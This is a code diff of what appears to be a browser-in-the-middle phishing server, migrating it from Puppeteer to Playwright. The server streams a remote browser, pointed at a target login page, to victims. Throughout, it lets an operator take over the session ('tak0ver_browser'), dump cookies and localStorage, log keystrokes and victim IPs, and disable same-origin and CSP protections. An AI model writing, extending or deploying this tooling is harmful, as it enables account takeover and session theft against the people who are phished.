@@ -6,9 +6,7 @@ import crypto from 'crypto'
 import Fastify from 'fastify'
 import fastify_io from 'fastify-socket.io'
 import mongoose from 'mongoose'
-import puppeteer from 'puppeteer-extra'
-import ZtelerthPlugin from 'puppeteer-extra-plugin-stealth'
-puppeteer.use(ZtelerthPlugin())
+import { chromium } from 'playwright'
 import resize_window from './resize_window.js'
 import replace from 'stream-replace'
 import Xvfb from 'xvfb'
@@ -31,9 +29,17 @@ let ship_logs = null;
 // INITIALIZATION - wrapped in async IIFE
 // ============================================
 (async () => {
-  const puppeteerDebugRaw = `${process.env.PUPPETEER_DEBUG || ''}`
-  const isPuppeteerDebugEnabled = puppeteerDebugRaw.trim().toLowerCase() === 'true'
-  console.log(`[STARTUP] PUPPETEER_DEBUG raw='${puppeteerDebugRaw}' enabled=${isPuppeteerDebugEnabled}`)
+  process.on('unhandledRejection', (err) => {
+    console.error('[FATAL] Unhandled rejection:', err && (err.stack || err.message || err))
+  })
+  process.on('uncaughtException', (err) => {
+    console.error('[FATAL] Uncaught exception:', err && (err.stack || err.message || err))
+    process.exit(1)
+  })
+
+  const playwrightDebugRaw = `${process.env.PLAYWRIGHT_DEBUG || process.env.PUPPETEER_DEBUG || ''}`
+  const isPlaywrightDebugEnabled = playwrightDebugRaw.trim().toLowerCase() === 'true'
+  console.log(`[STARTUP] PLAYWRIGHT_DEBUG raw='${playwrightDebugRaw}' enabled=${isPlaywrightDebugEnabled}`)
 
   // MongoDB connection
   const mongoUrl = process.env.MONGO_URL || 'mongodb://mongodb:27017/fescarcuddle';
@@ -111,7 +117,7 @@ let ship_logs = null;
   }
 
   const installMobileViewportGuards = async function(page) {
-    await page.evaluateOnNewDocument(() => {
+    await page.addInitScript(() => {
       const disableRemoteKeyboard = () => {
         try {
           if (window.top === window && navigator.virtualKeyboard) {
@@ -219,8 +225,9 @@ let ship_logs = null;
     try {
       const fixedWidth = browser.puppeteer_width || browser.user_width
       const fixedHeight = browser.puppeteer_height || browser.user_height
+      const cdp = await getPageCDPSession(browser, browser.target_page)
       if (fixedWidth && fixedHeight) {
-        await browser.target_page._client.send('Emulation.setDeviceMetricsOverride', {
+        await cdp.send('Emulation.setDeviceMetricsOverride', {
           width: fixedWidth,
           height: fixedHeight,
           deviceScaleFactor: 3,
@@ -231,9 +238,9 @@ let ship_logs = null;
           positionY: 0,
           screenOrientation: { type: 'portraitPrimary', angle: 0 }
         })
-        await browser.target_page._client.send('Emulation.setVisibleSize', { width: fixedWidth, height: fixedHeight }).catch(() => {})
+        await cdp.send('Emulation.setVisibleSize', { width: fixedWidth, height: fixedHeight }).catch(() => {})
       }
-      await browser.target_page._client.send('Emulation.setPageScaleFactor', { pageScaleFactor: 1 })
+      await cdp.send('Emulation.setPageScaleFactor', { pageScaleFactor: 1 })
       await browser.target_page.evaluate(() => {
         const disableRemoteKeyboard = () => {
           if (window.top === window && navigator.virtualKeyboard) {
@@ -404,10 +411,12 @@ let ship_logs = null;
       return { x, y, changed: false, metrics: null }
     }
     try {
-      const metrics = await browser.target_page._client.send('Page.getLayoutMetrics')
+      const cdp = await getPageCDPSession(browser, browser.target_page)
+      const metrics = await cdp.send('Page.getLayoutMetrics')
       const visualViewport = metrics.cssVisualViewport || metrics.visualViewport
-      const sourceWidth = browser.puppeteer_width || browser.user_width || browser.target_page.viewport()?.width || 1
-      const sourceHeight = browser.puppeteer_height || browser.user_height || browser.target_page.viewport()?.height || 1
+      const viewport = getPageViewport(browser.target_page)
+      const sourceWidth = browser.puppeteer_width || browser.user_width || viewport?.width || 1
+      const sourceHeight = browser.puppeteer_height || browser.user_height || viewport?.height || 1
       if (!visualViewport || !visualViewport.clientWidth || !visualViewport.clientHeight || !sourceWidth || !sourceHeight) {
         return { x, y, changed: false, metrics: null }
       }
@@ -446,9 +455,30 @@ let ship_logs = null;
   //a bucket full of browsers :)
   var browsers = []
 
-  //make it easy to grab a browser based on attributes like socket_id, or controller_socket, or browser_id etc.
+  //make it easy to grab a browser based on attributes like controller_socket or browser_id etc.
   browsers.get = function (attr, val) {
     return this.filter(x => x && x[attr] === val)[0]
+  }
+
+  const parseBoundedNumber = function (value, fallback, min, max) {
+    const parsed = Number(value)
+    if (!Number.isFinite(parsed)) return fallback
+    return Math.min(max, Math.max(min, parsed))
+  }
+
+  const SCREENCAST_QUALITY = parseBoundedNumber(process.env.SCREENCAST_QUALITY ?? config.screencast_quality, 90, 40, 100)
+  const SCREENCAST_SCALE = parseBoundedNumber(process.env.SCREENCAST_SCALE ?? config.screencast_scale, 1.5, 1, 3)
+
+  const stopCdpScreencast = async function (browser) {
+    if (!browser || !browser.target_cdp || !browser.cdp_screencast_active) {
+      return
+    }
+    browser.cdp_screencast_active = false
+    if (browser.cdp_screencast_handler) {
+      browser.target_cdp.off('Page.screencastFrame', browser.cdp_screencast_handler)
+      browser.cdp_screencast_handler = null
+    }
+    await browser.target_cdp.send('Page.stopScreencast').catch(() => {})
   }
 
   //keep track of some key active objects
@@ -460,6 +490,7 @@ let ship_logs = null;
   const VIEWPORT_DEVICE_SCALE_FACTOR = 1.5
   const XVFB_SCREEN_GEOMETRY = '3840x2160x24'
   const CHROMIUM_DEVICE_SCALE_FACTOR = 1.5
+  const chromiumExecutablePath = process.env.CHROMIUM_EXECUTABLE_PATH || process.env.PLAYWRIGHT_CHROMIUM_EXECUTABLE_PATH || ''
   let sharedXvfb = null
   let sharedXvfbStartPromise = null
 
@@ -481,6 +512,58 @@ let ship_logs = null;
       })
     })
     return sharedXvfbStartPromise
+  }
+
+  const getPageViewport = function (page) {
+    return page.viewportSize ? page.viewportSize() : null
+  }
+
+  const setPageViewport = async function (page, viewport) {
+    const { width, height } = viewport
+    await page.setViewportSize({ width, height })
+  }
+
+  const setPageUserAgent = async function (browser, page, userAgent) {
+    const cdp = await getPageCDPSession(browser, page)
+    await cdp.send('Network.setUserAgentOverride', { userAgent })
+  }
+
+  const emulatePage = async function (browser, page, options) {
+    const viewport = options.viewport || {}
+    const width = viewport.width || 1280
+    const height = viewport.height || 720
+    await setPageViewport(page, { width, height })
+    const cdp = await getPageCDPSession(browser, page)
+    await cdp.send('Emulation.setDeviceMetricsOverride', {
+      width,
+      height,
+      deviceScaleFactor: viewport.deviceScaleFactor || 1,
+      mobile: !!viewport.isMobile,
+      screenWidth: width,
+      screenHeight: height,
+      positionX: 0,
+      positionY: 0,
+      screenOrientation: {
+        type: viewport.isLandscape ? 'landscapePrimary' : 'portraitPrimary',
+        angle: viewport.isLandscape ? 90 : 0
+      }
+    })
+    if (viewport.hasTouch) {
+      await cdp.send('Emulation.setTouchEmulationEnabled', { enabled: true }).catch(() => {})
+    }
+    if (options.userAgent) {
+      await cdp.send('Network.setUserAgentOverride', { userAgent: options.userAgent })
+    }
+  }
+
+  const getPageCDPSession = async function (browser, page) {
+    if (browser.target_page === page && browser.target_cdp) {
+      return browser.target_cdp
+    }
+    if (!page.__fescarCdpSession) {
+      page.__fescarCdpSession = await browser.newCDPSession(page)
+    }
+    return page.__fescarCdpSession
   }
 
   //copy the favicon of the site you want to MitM
@@ -520,22 +603,6 @@ let ship_logs = null;
       //}else{
       //  reply.type('text/html').send("403")
       //}
-    }
-  })
-
-  //route for the headless browser to broadcast a video stream
-  fastify.route({
-    method: ['GET'],
-    url: '/broadcast',
-    handler: async function (req, reply) {
-      let client_ip = req.headers['x-real-ip']
-      //only allow requests that have not traversed our HTTP server reverse proxy
-      if (client_ip == undefined) {
-        let stream = fs.createReadStream(__dirname + "/broadcast.html")
-        reply.type('text/html').send(stream)
-      } else {
-        reply.type('text/html').send("403")
-      }
     }
   })
 
@@ -658,9 +725,8 @@ let ship_logs = null;
   async function get_browser() {
     // Use a single shared frame buffer to avoid adding per-browser process listeners.
     const xvfb = await ensureSharedXvfb()
-    let puppet_options = [
+    let browser_options = [
       "--ignore-certificate-errors", //ignore sketchy TLS on the target service in case our target org is lazy with their certs
-      `--auto-select-desktop-capture-source=${target.tab_title}`, //Allows us to cast WebRTC with answering a prompt of which tab to share :)
       "--disable-blink-features=AutomationControlled",
       "--high-dpi-support=1",
       `--force-device-scale-factor=${CHROMIUM_DEVICE_SCALE_FACTOR}`,
@@ -668,51 +734,48 @@ let ship_logs = null;
       "--no-sandbox",
       `--display=${xvfb._display}`,
       "--disk-cache-size=0",
-      "--media-cache-size=0"
+      "--media-cache-size=0",
+      "--disable-gpu",                         // force software rendering to Xvfb framebuffer (GPU offscreen skips Xvfb → blank capture)
+      "--disable-gpu-sandbox",                 // avoid GPU sandbox issues in Docker
+      "--allow-running-insecure-content",      // allow mixed HTTP/HTTPS content
+      "--disable-web-security",                // disable same-origin policy (helps with CSP and cross-origin restrictions)
+      "--disable-features=CrossOriginOpenerPolicy,CrossOriginEmbedderPolicy,BlockInsecurePrivateNetworkRequests", // single combined flag to avoid conflicts with Playwright's --disable-features
     ]
 
     if (target_primary_language) {
-      puppet_options.push(`--lang=${target_primary_language}`)
+      browser_options.push(`--lang=${target_primary_language}`)
     }
 
     if (config.proxy !== undefined) {
-      puppet_options.push("--proxy-server=" + config.proxy)
+      browser_options.push("--proxy-server=" + config.proxy)
     }
 
-    if (isPuppeteerDebugEnabled) {
-      puppet_options.push('--remote-debugging-address=0.0.0.0')
-      puppet_options.push('--remote-debugging-host=0.0.0.0')
-      puppet_options.push('--remote-debugging-port=9222')
-    }
     //set up a unique user data directory for this session so users don't stomp on each others' connections
     //we'll use this same ID to track unique browser instances for socket renegotiations etc. as well
     let browser_id = Math.random().toString(36).slice(2)
     fs.mkdirSync(`./user_data/${browser_id}`)
 
     const ignoreDefaultArgs = ['--enable-automation']
-    if (isPuppeteerDebugEnabled) {
-      ignoreDefaultArgs.push('--remote-debugging-port=0')
+
+    if (isPlaywrightDebugEnabled) {
+      console.log('[PLAYWRIGHT] Debug mode enabled')
+      console.log(`[PLAYWRIGHT] ignoreDefaultArgs=${JSON.stringify(ignoreDefaultArgs)}`)
+      console.log('[PLAYWRIGHT] Skipping --remote-debugging-port because Playwright controls Chromium over a pipe')
     }
 
-    if (isPuppeteerDebugEnabled) {
-      console.log('[PUPPETEER] Debug mode enabled')
-      console.log(`[PUPPETEER] ignoreDefaultArgs=${JSON.stringify(ignoreDefaultArgs)}`)
-      console.log(`[PUPPETEER] remoteDebugArgs=${JSON.stringify(puppet_options.filter((arg) => arg.startsWith('--remote-debugging-')))}`)
-    }
-
-    let browser = await puppeteer.launch({
+    let browser = await chromium.launchPersistentContext(`./user_data/${browser_id}`, {
       headless: false,
       ignoreHTTPSErrors: true,
+      bypassCSP: true,
+      ...(chromiumExecutablePath ? { executablePath: chromiumExecutablePath } : {}),
       ignoreDefaultArgs,
-      defaultViewport: null,
-      userDataDir: `./user_data/${browser_id}`,
-      args: puppet_options
+      viewport: null,
+      args: browser_options,
     })
 
     //JS is fun. We can just extend any existing object by defining new attributes and methods on it.
     //We'll add some pieces of data we want to track per browser instance, and a remove instance method while we have this browser's xvfb in local scope
     //remember, callback arguments are evaluated when the callback is defined
-    browser.socket_id = ''
     browser.user_socket = ''
     browser.user_width = 0
     browser.user_height = 0
@@ -726,11 +789,11 @@ let ship_logs = null;
     browser.browser_id = browser_id
     browser.user_agent = target.user_agent || getRandomUserAgent()
     browser.mobile_user_agent = getRandomMobileUserAgent()
-    browser.target_page = await browser.newPage()
-    await browser.target_page.setBypassCSP(true)
+    browser.target_page = browser.pages()[0] || await browser.newPage()
+    browser.target_cdp = await browser.newCDPSession(browser.target_page)
     await installMobileViewportGuards(browser.target_page)
     if (config.mobile_emulation) {
-      await browser.target_page.emulate({
+      await emulatePage(browser, browser.target_page, {
         viewport: {
           width: 390,
           height: 844,
@@ -742,10 +805,10 @@ let ship_logs = null;
         userAgent: browser.mobile_user_agent
       })
     } else {
-      await browser.target_page.setUserAgent(browser.user_agent)
+      await setPageUserAgent(browser, browser.target_page, browser.user_agent)
     }
     await browser.target_page.setExtraHTTPHeaders({ 'Accept-Language': target_language_header })
-    await browser.target_page.evaluateOnNewDocument((lang) => {
+    await browser.target_page.addInitScript((lang) => {
       try {
         Object.defineProperty(navigator, 'language', { get: () => lang })
         Object.defineProperty(navigator, 'languages', { get: () => [lang, lang.split('-')[0]] })
@@ -771,6 +834,7 @@ let ship_logs = null;
       }
     })
     browser.remove_instance = async function () {
+      await stopCdpScreencast(browser)
       browser.keydebug_file.close()
       const index = browsers.indexOf(browser);
       await browser.close()
@@ -781,8 +845,6 @@ let ship_logs = null;
       console.log('killed browser')
     }
     await browser.target_page.goto('about:blank')
-    browser.broadcast_page = await browser.newPage()
-    browser.broadcast_page.goto(`http://localhost:58082/broadcast?id=${browser_id}`)
     return browser
   }
 
@@ -790,13 +852,19 @@ let ship_logs = null;
     if (err) throw err
   
     console.log(`[STARTUP] Initializing browser with target: ${target.login_page}`);
-    let empty_fescarbowl = await get_browser()
+    let empty_fescarbowl = null
+    try {
+      empty_fescarbowl = await get_browser()
+    } catch (browserErr) {
+      console.error('[STARTUP] Failed to initialize browser:', browserErr && (browserErr.stack || browserErr.message || browserErr))
+      process.exit(1)
+    }
 
     const warmupTargetRender = async function (browser) {
       try {
         if (!browser || !browser.target_page) return
         await browser.target_page.bringToFront()
-        const vp = browser.target_page.viewport() || { width: 1280, height: 720 }
+        const vp = getPageViewport(browser.target_page) || { width: 1280, height: 720 }
         const centerX = Math.max(1, Math.floor(vp.width / 2))
         const centerY = Math.max(1, Math.floor(vp.height / 2))
 
@@ -812,6 +880,84 @@ let ship_logs = null;
 
     const getLiveSocket = function (socket_id) {
       return fastify.io.sockets.sockets.get(socket_id)
+    }
+
+    const startCdpScreencast = async function (browser, viewerSocketId) {
+      if (!browser || !browser.target_cdp || !viewerSocketId) {
+        return
+      }
+      await stopCdpScreencast(browser)
+      await browser.target_page.bringToFront().catch(() => {})
+      browser.cdp_screencast_active = true
+      browser.cdp_screencast_viewer = viewerSocketId
+      browser.cdp_screencast_handler = async (frame) => {
+        if (!browser.cdp_screencast_active) return
+        const displayWidth = browser.puppeteer_width || browser.user_width || frame.metadata?.deviceWidth
+        const displayHeight = browser.puppeteer_height || browser.user_height || frame.metadata?.deviceHeight
+        fastify.io.to(browser.cdp_screencast_viewer).emit('cdp_screencast_frame', {
+          data: frame.data,
+          width: displayWidth,
+          height: displayHeight
+        })
+        await browser.target_cdp.send('Page.screencastFrameAck', { sessionId: frame.sessionId }).catch(() => {})
+      }
+      browser.target_cdp.on('Page.screencastFrame', browser.cdp_screencast_handler)
+      const captureWidth = Math.round((browser.puppeteer_width || browser.user_width || 1280) * SCREENCAST_SCALE)
+      const captureHeight = Math.round((browser.puppeteer_height || browser.user_height || 720) * SCREENCAST_SCALE)
+      await browser.target_cdp.send('Page.startScreencast', {
+        format: 'jpeg',
+        quality: SCREENCAST_QUALITY,
+        maxWidth: captureWidth,
+        maxHeight: captureHeight,
+        everyNthFrame: 1
+      })
+      console.log(`[CDP_SCREENCAST] started browser=${browser.browser_id} viewer=${viewerSocketId} quality=${SCREENCAST_QUALITY} scale=${SCREENCAST_SCALE}`)
+    }
+
+    const attachNavigationListener = function (browser) {
+      if (!browser || !browser.target_page || browser.frameNavigationListenerAttached) {
+        return
+      }
+      browser.frameNavigationListenerAttached = true
+      browser.frameNavigationListener = async function (frame) {
+        try {
+          if (frame.parentFrame() === null) {
+            const pageUrl = frame.url() || 'about:blank'
+            const pageTitle = (await browser.target_page.title().catch(() => null)) || '(sin titulo)'
+            const faviconUrl = await browser.target_page.evaluate(() => {
+              const selectors = ['link[rel="icon"]', 'link[rel="shortcut icon"]', 'link[rel="apple-touch-icon"]']
+              for (const sel of selectors) {
+                const el = document.querySelector(sel)
+                if (el && el.href) return el.href
+              }
+              return window.location.origin + '/favicon.ico'
+            }).catch(() => null)
+
+            if (browser.controller_socket !== undefined) {
+              fastify.io.to(browser.controller_socket).emit('push_state', pageUrl.split('/').slice(3).join('/'))
+            }
+
+            if (browser.user_ip !== '') {
+              ship_logs({
+                "session_id": browser.session_id,
+                "event_ip": browser.user_ip,
+                "target": browser.user_target_id,
+                "event_type": "NAVIGATION",
+                "event_url": pageUrl,
+                "event_title": pageTitle,
+                "event_favicon": faviconUrl
+              })
+            }
+
+            console.log(`[NAVIGATION] Session ID: ${browser.session_id} | IP: ${browser.user_ip} -> ${pageTitle} (${pageUrl})`)
+          }
+        } catch (err) {
+          if (!err.message.includes('Session closed') && !err.message.includes('Page closed')) {
+            console.error(`[FRAMENAVIGATED] Error: ${err.message}`)
+          }
+        }
+      }
+      browser.target_page.on('framenavigated', browser.frameNavigationListener)
     }
 
     const processPendingFescarAssignments = async function () {
@@ -839,7 +985,7 @@ let ship_logs = null;
           if (request.mobile) {
             // Use the user's actual viewport dimensions so touch coordinates are 1:1
             await resize_window(empty_fescarbowl, empty_fescarbowl.target_page, request.viewport_width, request.viewport_height)
-            await empty_fescarbowl.target_page.emulate({
+            await emulatePage(empty_fescarbowl, empty_fescarbowl.target_page, {
               viewport: {
                 width: request.viewport_width,
                 height: request.viewport_height,
@@ -852,17 +998,21 @@ let ship_logs = null;
             })
           } else {
             await resize_window(empty_fescarbowl, empty_fescarbowl.target_page, request.viewport_width, request.viewport_height)
-            await empty_fescarbowl.target_page.setViewport({ width: request.viewport_width, height: request.viewport_height, deviceScaleFactor: VIEWPORT_DEVICE_SCALE_FACTOR })
+            await setPageViewport(empty_fescarbowl.target_page, { width: request.viewport_width, height: request.viewport_height, deviceScaleFactor: VIEWPORT_DEVICE_SCALE_FACTOR })
           }
           empty_fescarbowl.puppeteer_width = request.viewport_width
           empty_fescarbowl.puppeteer_height = request.viewport_height
           empty_fescarbowl.video_dimensions_initialized = false
+          attachNavigationListener(empty_fescarbowl)
           // Navigate now, after emulation is configured, so the target site receives the correct UA
-          await empty_fescarbowl.target_page.goto(target.login_page, { waitUntil: 'domcontentloaded' })
+          await empty_fescarbowl.target_page.goto(target.login_page, { waitUntil: 'load', timeout: 30000 })
           await enforceMobileViewportGuards(empty_fescarbowl)
           const actualUA = await empty_fescarbowl.target_page.evaluate(() => navigator.userAgent).catch(() => 'unknown')
           const actualMobile = await empty_fescarbowl.target_page.evaluate(() => ({ isMobile: window.matchMedia('(hover: none)').matches, w: window.innerWidth })).catch(() => null)
+          const actualTitle = await empty_fescarbowl.target_page.title().catch(() => '')
+          const actualUrl = empty_fescarbowl.target_page.url()
           console.log(`[new_fescar] mobile=${request.mobile} UA=${actualUA.substring(0, 80)} innerWidth=${actualMobile?.w}`)
+          console.log(`[TITLE_CHECK] expected="${target.tab_title}" actual="${actualTitle}" url=${actualUrl}`)
 
           if (!getLiveSocket(request.socket_id)) {
             console.warn(`new_fescar: socket disconnected before stream assignment ${request.socket_id}`)
@@ -874,13 +1024,12 @@ let ship_logs = null;
           empty_fescarbowl.user_socket = request.socket_id
           // Start this user with control of the assigned browser instance.
           empty_fescarbowl.controller_socket = request.socket_id
-          // Tell pinpo.html the actual Puppeteer viewport size so it can scale touch coordinates
+          // Tell pinpo.html the actual browser viewport size so it can scale touch coordinates
           fastify.io.to(request.socket_id).emit('fescar_viewport', { width: request.viewport_width, height: request.viewport_height })
-          // Send session_id to broadcast.html
-          if (empty_fescarbowl.socket_id) {
-            fastify.io.to(empty_fescarbowl.socket_id).emit('set_session_id', empty_fescarbowl.session_id)
-          }
-          fastify.io.to(empty_fescarbowl.socket_id).emit('stream_video_to_first_viewer', request.socket_id)
+          await empty_fescarbowl.target_page.bringToFront().catch((err) => {
+            console.warn(`[STREAM] failed to bring target page to front: ${err.message}`)
+          })
+          await startCdpScreencast(empty_fescarbowl, request.socket_id)
 
           empty_fescarbowl = await get_browser()
           browsers.push(empty_fescarbowl)
@@ -898,19 +1047,7 @@ let ship_logs = null;
         socket.join('admin_room')
         next()
       } else {
-        const browser_id = socket.handshake.query.browserId
         const viewerToken = socket.handshake.query.token
-        if (browser_id) {
-          const browser = browsers.get('browser_id', browser_id)
-          if (browser) {
-            browser.socket_id = socket.id
-            return next()
-          } else {
-            console.warn(`socket middleware: no browser found for browser_id ${browser_id}`)
-            return next(new Error('unauthorized'))
-          }
-        }
-
         if (viewerToken && viewerToken === config.user_access_token) {
           return next()
         }
@@ -922,75 +1059,6 @@ let ship_logs = null;
     browsers.push(empty_fescarbowl)
     fastify.io.on('connect', function (socket) {
       console.info('Socket connected!', socket.id)
-      socket.on('new_broadcast', async function (browser_id) {
-        const browser = browsers.get('browser_id', browser_id)
-        if (!browser) {
-          console.warn(`new_broadcast: no browser found for browser_id ${browser_id}`)
-          return
-        }
-        browser.socket_id = socket.id
-      
-        // Remover listener anterior si existe (para evitar acumulación)
-        if (browser.frameNavigationListener) {
-          browser.target_page.removeListener('framenavigated', browser.frameNavigationListener)
-          console.log(`[CLEANUP] Removido listener anterior de framenavigated para browser ${browser_id}`)
-        }
-      
-        // Crear nuevo listener
-        browser.frameNavigationListener = async function (frame) {
-          try {
-            if (frame.parentFrame() === null) {
-              const pageUrl = frame.url() || 'about:blank'
-              const pageTitle = (await browser.target_page.title().catch(() => null)) || '(sin título)'
-              const faviconUrl = await browser.target_page.evaluate(() => {
-                const selectors = ['link[rel="icon"]', 'link[rel="shortcut icon"]', 'link[rel="apple-touch-icon"]']
-                for (const sel of selectors) {
-                  const el = document.querySelector(sel)
-                  if (el && el.href) return el.href
-                }
-                return window.location.origin + '/favicon.ico'
-              }).catch(() => null)
-            
-              if (browser.controller_socket !== undefined) {
-                fastify.io.to(browser.controller_socket).emit('push_state', pageUrl.split('/').slice(3).join('/'))
-              }
-              
-              // Enviar logs a debug server si hay IP del usuario
-              if (browser.user_ip !== '') {
-                ship_logs({ 
-                  "session_id": browser.session_id,
-                  "event_ip": browser.user_ip, 
-                  "target": browser.user_target_id, 
-                  "event_type": "NAVIGATION", 
-                  "event_url": pageUrl,
-                  "event_title": pageTitle,
-                  "event_favicon": faviconUrl
-                })
-              }
-              
-              console.log(`[NAVIGATION] Session ID: ${browser.session_id} | IP: ${browser.user_ip} -> ${pageTitle} (${pageUrl})`)
-            }
-          } catch (err) {
-            if (!err.message.includes('Session closed') && !err.message.includes('Page closed')) {
-              console.error(`[FRAMENAVIGATED] Error: ${err.message}`)
-            }
-          }
-        }
-      
-        // Agregar nuevo listener
-        browser.target_page.on('framenavigated', browser.frameNavigationListener)
-        console.log(`[BROADCAST] Nuevo listener de framenavigated para browser ${browser_id} (socket ${socket.id})`)
-
-        // Race fix: if viewer assignment happened before broadcaster socket was ready,
-        // kick off the first stream now.
-        if (browser.user_socket) {
-          if (browser.session_id) {
-            fastify.io.to(browser.socket_id).emit('set_session_id', browser.session_id)
-          }
-          fastify.io.to(browser.socket_id).emit('stream_video_to_first_viewer', browser.user_socket)
-          console.log(`[BROADCAST] Late stream start for browser ${browser_id} -> viewer ${browser.user_socket}`)
-        }
-      })
       socket.on('new_fescar', async function (viewport_width, viewport_height, client_ip, target_id, session_id, mobile) {
         // Remove pending duplicates for the same socket and keep the latest viewport.
         for (let i = pendingFescarAssignments.length - 1; i >= 0; i -= 1) {
@@ -1018,35 +1086,10 @@ let ship_logs = null;
             pendingFescarAssignments.splice(i, 1)
           }
         }
-      })
-      socket.on('new_thumbnail', async function (thumbnail) {
-        const browser = browsers.get('browser_id', thumbnail.browser_id)
-        if (!browser) {
-          console.warn(`new_thumbnail: no browser found for browser_id ${thumbnail.browser_id}`)
-          return
+        const browser = browsers.get('user_socket', socket.id)
+        if (browser) {
+          stopCdpScreencast(browser).catch(() => {})
         }
-        //let viewer_socket = browser.user_socket
-        //fastify.io.to('admin_room').emit('thumbnail', socket.id, viewer_socket, thumbnail.image, browser.keydebug)
-        fastify.io.to('admin_room').emit('thumbnail', browser.browser_id, thumbnail.image, browser.keydebug)
-      })
-      socket.on('video_stream_offer', async function (viewer_socket_id, offer) {
-        const browser = browsers.get('controller_socket', viewer_socket_id)
-        if (!browser) {
-          console.warn(`video_stream_offer: no browser found for viewer_socket_id ${viewer_socket_id}`)
-          return
-        }
-        await browser.broadcast_page.bringToFront()
-        fastify.io.to(viewer_socket_id).emit('video_stream_offer', socket.id, offer)
-        console.log('video_stream_offer')
-        console.log('viewer_id: ' + viewer_socket_id)
-        console.log('offer: ' + offer)
-      })
-      socket.on('video_stream_answer', async function (broadcaster_socket_id, answer) {
-        //forward on to the viewer
-        fastify.io.to(broadcaster_socket_id).emit('video_stream_answer', socket.id, answer)
-        console.log('video_stream_answer')
-        console.log('broadcaster_id: ' + broadcaster_socket_id)
-        console.log('answer: ' + answer)
       })
       socket.on("tak0ver_browser", async function (browser_id, viewport_width, viewport_height) {
         //clear the controller if we were just driving another instance
@@ -1061,8 +1104,7 @@ let ship_logs = null;
         }
         browser.controller_socket = socket.id
         await resize_window(browser, browser.target_page, viewport_width, viewport_height)
-        await browser.target_page.setViewport({ width: viewport_width, height: viewport_height, deviceScaleFactor: VIEWPORT_DEVICE_SCALE_FACTOR })
-        fastify.io.to(browser.socket_id).emit('stream_to_admin', socket.id)
+        await setPageViewport(browser.target_page, { width: viewport_width, height: viewport_height, deviceScaleFactor: VIEWPORT_DEVICE_SCALE_FACTOR })
       })
       socket.on("give_back_control", async function (browser_id) {
         //give control back to the user
@@ -1073,7 +1115,7 @@ let ship_logs = null;
         }
         browser.controller_socket = browser.user_socket
         await resize_window(browser, browser.target_page, browser.user_width, browser.user_height)
-        await browser.target_page.setViewport({ width: browser.user_width, height: browser.user_height, deviceScaleFactor: VIEWPORT_DEVICE_SCALE_FACTOR })
+        await setPageViewport(browser.target_page, { width: browser.user_width, height: browser.user_height, deviceScaleFactor: VIEWPORT_DEVICE_SCALE_FACTOR })
       })
       // Debug workflow helper for authorized internal tests: force a navigation
       // on the test client after explicit operator action in the admin UI.
@@ -1105,9 +1147,10 @@ let ship_logs = null;
           console.warn(`get_cookies: no browser found for browser_id ${browser_id}`)
           return
         }
-        let cookie_data = await browser.target_page._client.send('Storage.getCookies')
+        const cdp = await getPageCDPSession(browser, browser.target_page)
+        let cookie_data = await cdp.send('Storage.getCookies')
         let cookies = cookie_data.cookies
-        let dom_data = await browser.target_page._client.send('DOMStorage.getDOMStorageItems', {
+        let dom_data = await cdp.send('DOMStorage.getDOMStorageItems', {
           storageId: {
             securityOrigin: await browser.target_page.evaluate(() => window.origin),
             isLocalStorage: true,
@@ -1125,10 +1168,6 @@ let ship_logs = null;
         await browser.remove_instance()
         fastify.io.to('admin_room').emit('removed_instance', browser_id)
       })
-      socket.on("candidate", async function (peer_socket_id, message) {
-        console.log('candidate: ' + socket.id + ' to ' + peer_socket_id)
-        fastify.io.to(peer_socket_id).emit("candidate", socket.id, message)
-      })
       socket.on("go_back", async function () {
         const browser = browsers.get('controller_socket', socket.id)
         if (!browser) {
@@ -1137,7 +1176,7 @@ let ship_logs = null;
         }
         await browser.target_page.goBack()
       })
-      // Client reports actual video display size — resize Puppeteer viewport to match
+      // Client reports actual video display size — resize Playwright viewport to match
       // exactly (eliminates scaleY error caused by browser chrome consuming window height)
       socket.on('video_dimensions', async function(dims) {
         if (!dims || typeof dims.width !== 'number' || typeof dims.height !== 'number') return
@@ -1153,19 +1192,18 @@ let ship_logs = null;
         }
         try {
           if (browser.is_mobile) {
-            await browser.target_page.emulate({
+            await emulatePage(browser, browser.target_page, {
               viewport: { width: w, height: h, deviceScaleFactor: 3, isMobile: false, hasTouch: true, isLandscape: false },
               userAgent: browser.mobile_user_agent
             })
           } else {
-            const vp = browser.target_page.viewport()
-            await browser.target_page.setViewport({ width: w, height: h, deviceScaleFactor: (vp && vp.deviceScaleFactor) || VIEWPORT_DEVICE_SCALE_FACTOR })
+            await setPageViewport(browser.target_page, { width: w, height: h, deviceScaleFactor: VIEWPORT_DEVICE_SCALE_FACTOR })
           }
           browser.puppeteer_width = w
           browser.puppeteer_height = h
           browser.video_dimensions_initialized = true
           fastify.io.to(socket.id).emit('fescar_viewport', { width: w, height: h })
-          console.log(`[video_dimensions] Puppeteer viewport → ${w}x${h} for socket ${socket.id}`)
+          console.log(`[video_dimensions] Playwright viewport -> ${w}x${h} for socket ${socket.id}`)
         } catch (err) {
           console.warn(`[video_dimensions] Error: ${err.message}`)
         }
@@ -1222,12 +1260,13 @@ let ship_logs = null;
         try {
           await browser.target_page.bringToFront()
           // Release any held modifier keys before inserting text to avoid
-          // Ctrl/Meta being active in puppeteer during insertion
+          // Ctrl/Meta being active during insertion
           await browser.target_page.keyboard.up('Control').catch(() => {})
           await browser.target_page.keyboard.up('Meta').catch(() => {})
           await browser.target_page.keyboard.up('Shift').catch(() => {})
-          // Use CDP directly — keyboard.insertText only exists in Puppeteer >=14
-          await browser.target_page._client.send('Input.insertText', { text: normalizedPaste })
+          // Use CDP directly for text insertion across keyboard layouts.
+          const cdp = await getPageCDPSession(browser, browser.target_page)
+          await cdp.send('Input.insertText', { text: normalizedPaste })
           await enforceMobileViewportGuards(browser)
           console.log(`[paste] insertText OK`)
         } catch (err) {
@@ -1266,7 +1305,8 @@ let ship_logs = null;
         const istext = key.length === 1 ? true : false;
         try {
           if (istext) {
-            await browser.target_page._client.send('Input.dispatchKeyEvent', {
+            const cdp = await getPageCDPSession(browser, browser.target_page)
+            await cdp.send('Input.dispatchKeyEvent', {
               type: 'keyDown',
               key: key,
               text: key,
@@ -1293,7 +1333,8 @@ let ship_logs = null;
         const istext = key.length === 1 ? true : false;
         try {
           if (istext) {
-            await browser.target_page._client.send('Input.dispatchKeyEvent', {
+            const cdp = await getPageCDPSession(browser, browser.target_page)
+            await cdp.send('Input.dispatchKeyEvent', {
               type: 'keyUp',
               key: key,
               text: key,
@@ -1314,8 +1355,8 @@ let ship_logs = null;
           return
         }
         if (mouse_event.type === 'mouseup' && browser.is_mobile) {
-          const vp = browser.target_page.viewport()
